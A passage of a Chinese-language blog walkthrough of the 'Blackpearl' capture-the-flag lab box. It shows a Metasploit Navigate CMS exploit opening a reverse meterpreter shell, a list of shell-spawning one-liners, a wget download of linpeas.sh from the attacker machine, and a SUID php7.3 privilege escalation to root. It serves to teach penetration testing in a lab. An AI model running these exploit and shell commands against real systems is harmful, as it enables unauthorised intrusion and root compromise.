class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> rhost 192.168.19.144**</span><br><span class="line">rhost =&gt; 192.168.19.144</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> vhost blackpearl.tcm**</span><br><span class="line">vhost =&gt; blackpearl.tcm</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     192.168.19.144   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST      blackpearl.tcm   no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[+] Login bypass successful</span><br><span class="line">[+] Upload successful</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Sending stage (39927 bytes) to 192.168.19.144</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.144:45840) at 2024-02-17 09:46:30 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **shell**</span><br><span class="line">Process 1843 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/blackpearl.tcm/navigate</span><br></pre></td></tr></table></figure>

<p>想要讓shell介面更好看</p>
<p><a target="_blank" rel="noopener" href="https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell">https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell</a></p>
<ul>
<li><p>TTY Shell</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">/bin/sh -i</span><br><span class="line"></span><br><span class="line">perl —e <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl: <span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line">ruby: <span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">lua: os.execute(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(From within IRB)</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">(From within vi)</span><br><span class="line">:!bash</span><br><span class="line"></span><br><span class="line">(From within vi)</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash:shell</span><br><span class="line"></span><br><span class="line">(From within nmap)</span><br><span class="line">!sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br><span class="line">**python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>**  </span><br><span class="line">www-data@blackpearl:~/blackpearl.tcm/navigate$</span><br></pre></td></tr></table></figure>

<p>利用<a target="_blank" rel="noopener" href="http://linpeas.sh/">linpeas.sh</a>獲取伺服器有用資訊，進行linux提權</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$  **wget http://192.168.19.130/linpeas.sh linpeas.sh**</span><br><span class="line"> wget http://192.168.19.130/linpeas.sh linpeas.sh</span><br><span class="line">--2024-02-17 10:36:38--  http://192.168.19.130/linpeas.sh</span><br><span class="line">Connecting to 192.168.19.130:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 853290 (833K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;linpeas.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">linpeas.sh          100%[===================&gt;] 833.29K  --.-KB/s    <span class="keyword">in</span> 0.05s   </span><br><span class="line"></span><br><span class="line">2024-02-17 10:36:38 (16.2 MB/s) - <span class="string">&#x27;linpeas.sh&#x27;</span> saved [853290/853290]</span><br><span class="line"></span><br><span class="line">--2024-02-17 10:36:38--  http://linpeas.sh/</span><br><span class="line">Resolving linpeas.sh (linpeas.sh)... failed: Temporary failure <span class="keyword">in</span> name resolution.</span><br><span class="line">wget: unable to resolve host address <span class="string">&#x27;linpeas.sh&#x27;</span></span><br><span class="line">FINISHED --2024-02-17 10:37:03--</span><br><span class="line">Total wall clock <span class="keyword">time</span>: 25s</span><br><span class="line">Downloaded: 1 files, 833K <span class="keyword">in</span> 0.05s (16.2 MB/s)</span><br><span class="line">www-data@blackpearl:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 868</span><br><span class="line">drwxrwxrwt  8 root     root       4096 Feb 17 10:39 .</span><br><span class="line">drwxr-xr-x 18 root     root       4096 May 30  2021 ..</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .ICE-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .XIM-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .font-unix</span><br><span class="line">**-rw-r--r--  1 www-data www-data 853290 Feb 15 14:03 linpeas.sh**</span><br><span class="line">drwx------  3 root     root       4096 Feb 17  2024 systemd-private-377639e5743d4205b9d4759ec2aad65c-systemd-timesyncd.service-q855cz</span><br><span class="line">www-data@blackpearl:/tmp$ **<span class="built_in">chmod</span> +x linpeas.sh**</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">www-data@blackpearl:/tmp$ **./linpeas.sh**</span><br><span class="line">./linpeas.sh</span><br><span class="line">....</span><br><span class="line">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               </span><br><span class="line">strings Not Found                                                                                              </span><br><span class="line">strace Not Found                                                                                               </span><br><span class="line">-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                      </span><br><span class="line">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br><span class="line">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br><span class="line">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                   </span><br><span class="line">-rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)</span><br><span class="line">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span><br><span class="line">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                        </span><br><span class="line">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span><br><span class="line"></span><br><span class="line">╔══════════╣ SGID</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               </span><br><span class="line">-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry                                                      </span><br><span class="line">-rwxr-sr-x 1 root <span class="built_in">tty</span> 35K Jan 10  2019 /usr/bin/wall</span><br><span class="line">-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent</span><br><span class="line">-rwxr-sr-x 1 root <span class="built_in">tty</span> 15K May  4  2018 /usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab</span><br><span class="line">-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile</span><br><span class="line">-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage</span><br><span class="line">-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔══════════╣ Backup files (limited 100)</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 1421 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/external/tracy/src/Tracy/assets/Debugger/error.500.phtml.bak</span><br><span class="line">**-rwxr-xr-x 1 www-data www-data 12282 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backups.php**</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 12546 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backup.class.php</span><br><span class="line">-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz</span><br><span class="line">-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="line">-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="line">-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>控制文件訪問權限、分別允許用戶以可執行文件的 owner 或 owner group 的權限運行可執行文件</p>
<p>SUID &gt;</p>
<ul>
<li>普通用戶想運行只有權限高用戶才能執行的文件，就要通過SUID的功能</li>
<li>owner的訊息為rws而不是rwx，當s出現在文件擁有者的權限上時，就稱為SETUID BITS或SETUID<ul>
<li>SUID權限僅對二進制可執行文件有效</li>
<li>執行者對二進制可執行文件具有x的權限，執行者將具有該文件的所有者權限</li>
<li>權限僅在<strong>執行二進制可執行文件的過程</strong>中有效</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">**-rws**r-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_46.png" alt="Untitled"></p>
<p>SGID &gt; </p>
<ul>
<li><p>當一般使用者 tester 執行 mlocate 指令時，tester 就會取得使用者群組 mlocate 的執行權限，又因為使用者群組 mlocate 對 mlocate.db 有讀取權限，所以 tester 就可以讀取 mlocate.db 了。</p>
<p>  <img src="/img/privilege_Untitled_47.png" alt="Untitled"></p>
</li>
<li><p>SGID 也可以用在目錄上</p>
<ul>
<li>使用者若對此目錄具有 r 和 x 權限，則該使用者能夠進入該目錄</li>
<li>使用者在此目錄下的有效使用者群組將變成該目錄的使用者群組</li>
<li>若使用者在此目錄下擁有 w 權限，則使用者建立的新檔案的使用者群組與該目錄的使用者群組相同</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwx**r-s**r-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry                                                      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>當 SGID 作用於普通檔案時，和 SUID 類似，在執行該檔案時，<strong>使用者將獲得該檔案所屬群組的權限</strong>。</p>
<p>當 SGID 作用於目錄時，意義就非常重大了。當使用者對<strong>某一目錄有寫入和執行權限</strong>時，該使用者就可以在該<strong>目錄下建立文件</strong>，如果該目錄以 SGID 修飾，則該使用者在這個目錄下建立的文件都是屬於這個目錄所屬的群組。</p>
<p>以數字的方式設定權限:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SUID-&gt;4</span><br><span class="line">SGID-&gt;2</span><br></pre></td></tr></table></figure>

<p>找出所有SUID</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$ find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment">#在系統中尋找擁有SUID權限設置的文件。具有SUID權限的文件在執行時將以其擁有者的身份而不是執行者的身份運行</span></span><br><span class="line">find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">**/usr/bin/php7.3**</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">www-data@blackpearl:/tmp$</span><br></pre></td></tr></table></figure>

<p>Google搜尋GTFOBins &gt; SUID&gt;</p>
<p>查找列出的指令跟上面列出的擁有SUID權限設置的文件只有php剛好匹配，利用它做權限提升</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/php/">https://gtfobins.github.io/gtfobins/php/</a></p>
<p><img src="/img/privilege_Untitled_48.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$ **/usr/bin/php7.3  -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span>**</span><br><span class="line">&lt;usr/bin/php7.3  -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) **euid=0(root)** <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">Good job on this one.</span><br><span class="line">Finding the domain name may have been a little guessy,</span><br><span class="line">but the goal of this box is mainly to teach about Virtual Host Routing <span class="built_in">which</span> is used <span class="keyword">in</span> a lot of CTF.</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/12/21/Crackme2/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          IDA - Crack me2
        
      </div>
    </a>
  
  
    <a href="/2024/12/21/c4/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">C4 - C In Four Functions</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>